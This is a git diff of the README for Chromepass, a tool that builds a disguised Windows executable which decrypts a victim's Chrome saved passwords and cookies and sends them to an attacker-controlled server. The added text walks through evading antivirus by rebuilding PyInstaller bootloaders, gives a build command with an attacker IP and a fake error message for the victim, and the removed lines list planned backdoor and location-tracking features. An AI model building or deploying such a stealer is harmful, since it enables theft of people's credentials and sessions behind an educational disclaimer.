@@ -1,6 +1,6 @@
 [![Gitpod Ready-to-Code](https://img.shields.io/badge/Gitpod-Ready--to--Code-blue?logo=gitpod)](https://gitpod.io/#https://github.com/darkarp/chromepass) 
 
-<h1 align='center'>Chromepass - Hacking Chrome Saved Passwords</h1>
+<h1 align='center'>Chromepass - Hacking Chrome Saved Passwords and Cookies</h1>
 <p align="center">	
     <img src="https://img.shields.io/badge/Platform-Windows-green" />
 	<a href="https://github.com/darkarp/chromepass/releases/latest">
@@ -52,92 +52,106 @@
 * [Errors, Bugs and Feature Requests](#errors-bugs-and-feature-requests)
 * [Learn More](#learn-more)
 * [License](#license)
-
+---
 ## About The project
 Chromepass is a python-based console application that generates a windows executable with the following features:
 
   - Decrypt Chrome saved paswords
-  - Send a file with the login/password combinations remotely (email or reverse-http)
+  - Send a file with the login/password combinations remotely (http server)
   - Custom icon
-  - Completely undetectable by AntiVirus Engines
+  - Undetectable by AV if done correctly
+
+---
 
 ### AV Detection!
-Due to the way this has been coded, it is currently fully undetected. Here are some links to scans performed using a variety of websites
-  - [VirusTotal Scan](https://www.virustotal.com/gui/file/b4780b4712f494dc9856ff23ce29415445ad5eea3776663da28c556645f0e202/detection) (0/68) 30-09-2019
-  	- this is an educational project, so distribution (or the lack thereof) is not a concern, hence the usage of VirusTotal
-  - [AntiScan](https://antiscan.me/scan/new/result?id=kmpsMNccfuRJ) (0/26) 24-09-2019
-  - [Hibrid Analysis](https://www.hybrid-analysis.com/sample/9ca69d2c60f0db6c09e9959b6f9c8bfdf66ddbe2e28f9f7539fd2856b62315c0) All Clean (CrowdStrike Falcon, MetaDefender and Virustotal) 24-09-2019  
-	
+This can be undetected with a very easy step detailed below. The reason why it's detected is because many AVs get tripped by the popular signatures of pyinstaller. To mitigate this, you can build the bootloaders manually. You can do this on a clean VM if you wish:
+ - Go through the [Installation](#installation) first
+ - Open an administrator powershell
+ - Run the following code and wait for it to finish, it might take a while: 
+```powershell
+Set-ExecutionPolicy remotesigned -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')); choco install -y python vcbuildtools git
+```
+ - Close the powershell window and open a new one (doesn't require administrator)
+ - Go into the chromepass directory, if you're not in it already.
+ - Run the following code: 
+  ```powershell
+     git clone https://github.com/pyinstaller/pyinstaller.git
+     pip uninstall pyinstaller -y
+     cd pyinstaller
+     python bootloader/waf all
+     pip install .
+  ```
+ - Now you can follow the [Usage](#usage) normally and your executable is no longer detected by most AVs.  
+ ---
 ## Getting started
 
 ### Dependencies and Requirements
 
 This is a very simple application, which uses only:
 
-* [Python] - Only tested on 3.7.4 but should work in 3.6+
+* [Python] - Tested on python 3.6+
 
 ### Installation
 
 Chromepass requires [Python] 3.6+ to run.
 
+Clone the repository:
+```powershell
+git clone https://github.com/darkarp/chromepass
+```
+
 Install the dependencies:
 
 ```powershell
-> cd chromepass
-> pip install -r requirements.txt
+cd chromepass
+pip install -r requirements.txt
 ```
 
-If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+ (preferably 3.7.4).
+If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+
 If the errors persist, try:
 ```powershell
-> python -m pip install --upgrade pip
-> python -m pip install -r requirements.txt
+python -m pip install --upgrade pip
+python -m pip install -r requirements.txt
 ```  
 
 ## Usage
 
 Chromepass is very straightforward. Start by running:
 ```powershell
-> python create_server.py
+> python create.py -h
 ```
-It will ask you to select between two options:
-*  **(1) via email**  _[_To be fixed_]_
-    * This will ask you for an ***email*** address and a ***password***
-    * It will then ask you if you wish to send to another address or to yourself
-    * Next, you're asked if you want to display an error message. This is a fake message that if enabled will appear when the victim opens the executable, after the passwords have been transferred.
-    * You can then write your own message or leave it blank
-    * You're done! Wait for the executable to be generated and then it's ready.
-    
-*  **(2) via client.exe** _[Recommended at the moment]_
-    * First you're asked to input an ***IP Address*** for a reverse connection. This is the address that belongs to the attacker. It can be a ***local IP address*** or a ***remote IP Address***. If a remote address is chosen, [Port Forwarding](https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/) needs to be in place.
-    * You're then asked if you want to display an error message. This is a fake message that if enabled will appear when the victim opens the executable, after the passwords have been transferred.
-    * You can then write your own message or leave it blank
-    * You're done! Wait for the executables to be generated and then it's ready.
-    * The **client.exe** must be started before the **server_ip.exe**. The **server_ip.exe** is the file the victim receives.
-* Note: To set a custom icon, replace ***icon.ico*** by the desired icon with the same name and format.
+A list of options will appear and are self explanatory.
 
+Running without any parameters will build the server and the client connecting to `127.0.0.1`. 
 
-## Todo
- - Sending Real-time precise location of the victim (***completed, releases next update***)
- - Also steal Firefox passwords (***Completed, releases next update***)
- - Option of installing a backdoor allowing remote control of the victim's computer (***completed, releases next update***)
- - Support for more email providers (***in progress***)
- - Also steal passwords from other programs, such as keychains(***in progress***)
- - Add Night Mode (***in progress***)
+A simple example of a build:
+```powershell
+python create.py --ip 92.34.11.220 --error --message "An Error has happened"
+```
+
+After creating the server and the client, make sure you're running the server when the client is ran.
+
+If you'd like additional notes on evading AV, refer to [AV Detection](#av-detection)  
+
+---
  
 ## Errors, Bugs and feature requests
 
 If you find an error or a bug, please report it as an issue.
 If you wish to suggest a feature or an improvement please report it in the issue pages.
 
-Please follow the templates shown when creating the issue.
+Please follow the templates shown when creating the issue.  
+
+---
 
 ## Learn More
 
 For access to a community full of aspiring computer security experts, ranging from the complete beginner to the seasoned veteran,
 join our Discord Server: [WhiteHat Hacking](https://discord.gg/beczNYP)
 
-If you wish to contact me, you can do so via: mario@whitehathacking.tech
+If you wish to contact me, you can do so via: `mario@whitehathacking.tech` 
+
+---
 
 ## Disclaimer
 I am not responsible for what you do with the information and code provided. This is intended for professional or educational purposes only.
